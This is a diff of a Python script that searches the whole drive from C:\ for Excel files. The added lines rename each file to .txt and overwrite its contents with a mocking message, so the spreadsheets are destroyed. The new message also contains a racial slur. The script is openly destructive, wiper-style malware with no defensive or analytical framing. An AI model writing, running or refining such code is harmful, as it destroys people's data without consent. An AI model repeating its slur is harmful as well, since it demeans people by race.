@@ -2,12 +2,19 @@ import os
 from concurrent.futures import ThreadPoolExecutor
 
 # Directory to start search (root of the file system)
-search_directory = 'C:\\'  # Change to 'C:/' for Windows, '/' for Linux/Mac
+search_directory = 'C:\\'  # Use raw string to avoid escape sequences
 
 def process_file(file_path):
-    txt_file_path = file_path[:-5] + '.txt'  # Change file extension from .xlsx to .txt
+    # New file path with .txt extension
+    txt_file_path = file_path[:-5] + '.txt'
+    
+    # Rename the file to .txt
+    os.rename(file_path, txt_file_path)
+    
+    # Write "lol" inside the renamed .txt file
     with open(txt_file_path, 'w') as txt_file:
-        txt_file.write('RIP your excell data buddy (btw i use arch linux xD)')
+        txt_file.write('RIP your data n1gga!')
+    
 
 # List to hold all found .xlsx files
 xlsx_files = []
